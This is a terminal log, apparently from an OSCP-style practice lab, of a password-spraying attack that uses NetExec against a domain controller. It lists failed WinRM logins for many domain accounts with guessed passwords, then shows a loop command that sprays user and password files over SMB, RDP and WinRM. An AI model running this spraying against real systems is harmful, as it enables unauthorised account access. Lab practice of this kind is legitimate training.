+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom_admin:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom.kinney:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\celia.almeda:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\krbtgt:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Guest:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Administrator:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\eric.wallows:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\web_svc:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\john.dorian:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\sql_svc:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:Diamond1
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:Diamond1 HTTPConnectionPool(host='10.10.197.146', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<H
+TTPConnection(host='10.10.197.146', port=5985) at 0x7fd627b8b130>, 'Connection to 10.10.197.146 timed out. (connect timeout=30)'))
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Joan.North:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom_admin:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom.kinney:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\celia.almeda:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\krbtgt:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Guest:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Administrator:Diamond1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\eric.wallows:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\web_svc:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\john.dorian:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\sql_svc:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Joan.North:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom_admin:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom.kinney:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\celia.almeda:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\krbtgt:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Guest:December31
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Administrator:December31
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m for i in smb rdp winrm; do nxc $i 10.10.197.146 -u users.txt -p passwords.txt --local-auth ;done
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) ([1m[32msigning:True[0m) ([1m[36mSMBv1:None[0m)[1m[33m (Null Auth:True)[0m
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\eric.wallows:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\web_svc:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\john.dorian:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\sql_svc:EricLikesRunning800 STATUS_LOGON_FAILURE
